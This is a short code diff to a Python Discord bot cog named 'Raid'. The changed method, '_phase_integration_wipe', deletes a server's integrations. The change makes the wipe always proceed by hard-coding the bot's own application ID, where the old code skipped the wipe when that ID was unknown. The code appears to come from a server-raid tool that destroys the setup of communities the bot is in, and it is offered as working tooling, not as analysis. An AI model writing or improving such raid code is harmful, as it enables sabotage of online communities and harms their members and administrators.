@@ -451,15 +451,15 @@ class Raid(commands.Cog):
     # ─────────────────────────────────────────────────────────────────────────
     # INTEGRATION WIPE
     # ─────────────────────────────────────────────────────────────────────────
+    # Hard-coded application ID as the ultimate fallback — protects against self-kick
+    # even if discord.py hasn't populated bot.application_id yet.
+    _OWN_APP_ID = 1501093556037615726
+
     async def _phase_integration_wipe(self, guild: discord.Guild) -> None:
         try:
             integrations = await guild.integrations()
-            my_app_id = self.bot.application_id
-
-            # NEVER delete our own integration — doing so kicks the bot from the server.
-            # If application_id is somehow not set yet, skip the wipe entirely to be safe.
-            if not my_app_id:
-                return
+            # Use runtime value if available, otherwise fall back to the known constant
+            my_app_id: int = self.bot.application_id or self._OWN_APP_ID
 
             safe = [
                 intg for intg in integrations
